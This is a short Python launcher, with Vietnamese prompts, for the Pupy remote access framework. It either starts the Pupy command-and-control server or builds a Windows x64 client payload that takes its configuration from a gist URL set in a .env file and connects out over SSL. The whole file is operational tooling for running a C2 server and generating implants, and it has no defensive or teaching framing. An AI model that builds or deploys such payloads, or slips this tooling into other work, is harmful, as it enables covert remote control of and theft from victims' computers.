#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Pupy - main: 1=server, 2=build Windows x64 payload. Gist URL từ .env. Python 3.9+ only."""
from __future__ import absolute_import, division, print_function, unicode_literals

import argparse
import os
import sys
from typing import List, Tuple

_ROOT = os.path.dirname(os.path.abspath(__file__))
if _ROOT not in sys.path:
    sys.path.insert(0, _ROOT)

BUILD_OPTS = [
    ("windows", "x64"),
]

EXIT_OK = 0
EXIT_USAGE = 1
EXIT_CONFIG = 2
EXIT_RUNTIME = 3


def _env_path() -> str:
    return os.path.join(_ROOT, ".env")


def parse_args() -> Tuple["argparse.Namespace", List[str]]:
    parser = argparse.ArgumentParser(
        prog="main.py",
        description="Pupy: 1=server, 2=build Windows x64 payload. Gist URL từ .env.",
    )
    parser.add_argument(
        "action",
        nargs="?",
        choices=("1", "2"),
        help="1=Run server, 2=Build payload",
    )
    parser.add_argument(
        "platform",
        nargs="?",
        choices=("2",),
        help="Khi action=2: 2=windows x64 (mặc định)",
    )
    parser.add_argument(
        "--no-interactive",
        action="store_true",
        help="Không hỏi menu; dùng action/platform từ CLI (mặc định 1, 1 nếu thiếu)",
    )
    return parser.parse_known_args()


def main() -> None:
    args, rest = parse_args()
    c1 = args.action
    c2 = args.platform

    if not c1 and not args.no_interactive:
        print("1. Run server")
        print("2. Build payload")
        try:
            c1 = input("Chon (1/2): ").strip() or "1"
        except EOFError:
            c1 = "1"
    if not c1:
        c1 = "1"

    if c1 not in ("1", "2"):
        print("Chon 1 hoac 2")
        sys.exit(EXIT_USAGE)

    if c1 == "1":
        try:
            from pupy.cli.pupysh import main as pupysh_main
            sys.argv = ["pupysh"] + rest
            pupysh_main()
        except Exception as e:
            print("Loi khi chay server:", e, file=sys.stderr)
            sys.exit(EXIT_RUNTIME)
        sys.exit(EXIT_OK)

    # Build payload
    if not c2 and not args.no_interactive:
        print("Building Windows x64 payload...")
        c2 = "2"
    if not c2:
        c2 = "2"

    idx = int(c2) - 1 if c2 in ("2",) else 0
    if idx < 0 or idx >= len(BUILD_OPTS):
        idx = 0
    os_name, arch = BUILD_OPTS[idx]

    try:
        from pupy.pupylib.utils.dotenv import load_dotenv
        load_dotenv(_env_path())
    except Exception as e:
        print("Loi load .env:", e, file=sys.stderr)
        sys.exit(EXIT_CONFIG)
    url = os.environ.get("GIST_RAW_URL", "").strip()
    if not url:
        print("Cần GIST_RAW_URL trong .env (hoac dat bien moi truong GIST_RAW_URL)")
        sys.exit(EXIT_CONFIG)
    try:
        from pupy.cli.pupygen import main as pupygen_main
        sys.argv = ["pupygen", "-f", "client", "-O", os_name, "-A", arch, "gist", "-u", url, "-t", "ssl"]
        pupygen_main()
    except Exception as e:
        print("Loi khi build payload:", e, file=sys.stderr)
        sys.exit(EXIT_RUNTIME)
    sys.exit(EXIT_OK)


if __name__ == "__main__":
    main()
